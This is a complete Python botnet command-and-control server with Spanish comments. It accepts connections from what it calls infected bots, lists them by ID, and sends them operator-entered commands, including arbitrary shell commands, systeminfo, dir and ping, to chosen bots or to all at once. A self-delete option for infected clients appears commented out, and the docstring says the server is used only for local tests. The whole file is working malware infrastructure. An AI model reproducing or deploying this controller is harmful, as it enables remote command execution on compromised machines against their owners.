import socket
import threading

HOST = "127.0.0.1"  # IP del servidor C&C
PORT = 9999  # Puerto que escucha el servidor C&C
bots = []  # Lista de bots conectados
bot_ids = {}  # Diccionario para almacenar los IDs de los bots

def manejar_bot(conn, addr, bot_id): 
    """
    Maneja una conexión entrante de un bot.

    Recibe los mensajes del bot y los imprime en la consola. Si el bot se
    desconecta, elimina su conexión de la lista de bots conectados y
    cierra la conexión.

    Parameters:
        conn (socket.socket): El socket de la conexión entrante del bot.
        addr (tuple): La dirección IP y puerto del bot conectado.
        bot_id (int): El ID del bot asignado automáticamente.

    Returns:
        None
    """
    print(f"Bot {bot_id} conectado desde {addr}") # Cuanto un bot se conecta se imprime su ID y la IP
    while True:
        try:
            # Recibir mensaje del bot (puede ser un comando o información)
            data = conn.recv(4096)  # Aumentar el tamaño del buffer para recibir más datos
            if not data: 
                break 

            print(f"Mensaje recibido de {addr}: {data.decode('utf-8', errors='ignore')}") # Imprimir el mensaje recibido

        except Exception as e:
            print(f"Error con {addr}: {e}")
            break
    
    conn.close() # Cierra la conexion
    bots.remove(conn) # Elimina la conexion
    del bot_ids[conn] # Elimina el ID
    print(f"Bot {bot_id} desconectado") # Imprime que el bot se desconecto

def servidor_CnC():
    """
    Inicia el servidor C&C.

    El servidor C&C se encarga de recibir conexiones de los bots infectados y
    de ofrecer un menú principal para interactuar con ellos. El menú principal
    permite:

    1. Listar los bots conectados.
    2. Dar órdenes a los bots.
    3. Cerrar la conexión de los bots.
    5. Salir de la consola.

    La opción 4, autoborrar cliente infectado, se encuentra comentada y no
    se utiliza actualmente. Esto se debe a que este programa se está utilizando solo
    para pruebas en local y no queremos autoborrar clientes infectados todo el rato.

    Returns:
        None
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creamos un socket
    server.bind((HOST, PORT))  # Asociamos el socket a la dirección y puerto
    server.listen(5)  # Escuchamos 5 conexiones entrantes
    print(f"Escuchando en {HOST}:{PORT}...")  # Imprimimos confirmación

    # Crear un hilo para aceptar conexiones entrantes (bots)
    threading.Thread(target=aceptar_conexiones, args=(server,)).start()

    while True:
        print("\nMenú Principal:")
        print("1. Listar bots conectados")
        print("2. Dar órdenes a los bots")
        print("3. Cerrar conexión de los bots")
        # print("4. Autoborrar cliente infectado")  # Opción comentada
        print("5. Salir de la consola")
        opcion = input("Seleccione una opción: ")

        if opcion == "1":
            listar_bots()
        elif opcion == "2":
            dar_ordenes()
        elif opcion == "3":
            cerrar_conexion_bots()
        elif opcion == "5":
            print("Saliendo de la consola...")
            exit()
        else:
            print("Opción no válida. Intente de nuevo.")

def aceptar_conexiones(server):
    """
    Acepta conexiones entrantes de bots y las maneja en un hilo separado.

    Este hilo se encarga de aceptar conexiones entrantes de bots, agregarlas a la
    lista de bots conectados y asignarles un ID único. Luego, crea un hilo
    separado para manejar cada bot conectado con la función `manejar_bot`.

    Parameters:
        server (socket.socket): El socket del servidor C&C que escucha conexiones entrantes.

    Returns:
        None
    """
    
    bot_id = 1
    while True:
        conn, addr = server.accept() # Aceptar conexiones entrantes (bots)
        bots.append(conn) # Concatenamos las conexiones a la lista de bots
        bot_ids[conn] = bot_id
        # Crear un hilo para manejar cada bot conectado
        threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()
        bot_id += 1

def listar_bots():
    """
    Lista todos los bots conectados al servidor C&C.

    Esta función imprime en la consola los IDs y direcciones de los bots
    actualmente conectados al servidor C&C. Si no hay bots conectados, 
    imprime un mensaje indicando que no hay conexiones activas.

    Returns:
        None
    """

    if bots: ## Si hay bots
        print("\nBots conectados:")
        for bot in bots: # Por cada bot
            print(f"Bot {bot_ids[bot]}: {bot.getpeername()}") # Imprime el ID y la dirección
    else:
        print("No hay bots conectados.")

def dar_ordenes():
    
    """
    Da órdenes a los bots conectados al servidor C&C.
    
    Si no hay bots, la función imprime por la consola que no hay bots conectados, si no,
    muestra un menú por pantalla para que el usuario pueda seleccionar lo que quiere hacer con el bot.
    El menú permite:
    1. Hacer PING a una dirección específica
    2. Comando personalizado
    3. Obtener información del sistema
    4. Listar archivos en el directorio actual
    5. Enviar orden a todos los bots
    
    Returns:
        None
    """
    
    if not bots: # Si no hay bots
        print("No hay bots conectados.")
        return

    print("\nÓrdenes disponibles:")
    print("1. Hacer PING a una dirección específica")
    print("2. Comando personalizado")
    print("3. Obtener información del sistema")
    print("4. Listar archivos en el directorio actual")
    print("5. Enviar orden a todos los bots")
    orden = input("Seleccione una orden: ")

    if orden == "1":
        direccion = input("Ingrese la dirección a hacer PING: ")
        comando = f"ping {direccion}"
    elif orden == "2":
        comando = input("Ingrese el comando personalizado: ")
    elif orden == "3":
        comando = "systeminfo"
    elif orden == "4":
        comando = "dir"
    elif orden == "5":
        comando = input("Ingrese el comando para todos los bots: ")
        for bot in bots:
            try:
                bot.send(comando.encode('utf-8')) # Envía el comando al bot codificado en UTF-8
            except Exception as e:
                print(f"Error al enviar orden a {bot.getpeername()}: {e}") # Si falla, imprimimos el error y el nombre del bot.
        return
    else:
        print("Orden no válida.")
        return

    print("\nSeleccione los bots a los que quiere dar órdenes (separados por comas) o 'todos' para todos los bots:")
    listar_bots()
    seleccion = input("Ingrese su selección: ")

    if seleccion.lower() == "todos":
        for bot in bots:
            try:
                bot.send(comando.encode('utf-8'))
            except Exception as e:
                print(f"Error al enviar orden a {bot.getpeername()}: {e}")
    else:
        bot_ids_seleccionados = [int(id.strip()) for id in seleccion.split(",")]
        for bot_id in bot_ids_seleccionados:
            bot = next((b for b in bots if bot_ids[b] == bot_id), None)
            if bot:
                try:
                    bot.send(comando.encode('utf-8'))
                except Exception as e:
                    print(f"Error al enviar orden a {bot.getpeername()}: {e}")
            else:
                print(f"ID de bot {bot_id} no válido.")

def cerrar_conexion_bots():
    """
    Cierra la conexión de un bot conectado al servidor C&C.

    Esta función lista los bots conectados y pide al usuario que ingrese el ID del
    bot cuya conexión quiere cerrar. Si el ID es válido, cierra la conexión del bot
    y lo elimina de la lista de bots conectados.

    Returns:
        None
    """
    if not bots:
        print("No hay bots conectados.")
        return

    listar_bots()
    bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: "))
    bot = next((b for b in bots if bot_ids[b] == bot_id), None)
    if not bot:
        print("ID de bot no válido.")
        return

    bot.close()
    bots.remove(bot)
    del bot_ids[bot]
    print(f"Conexión con el bot {bot_id} cerrada.")

if __name__ == "__main__":
    servidor_CnC()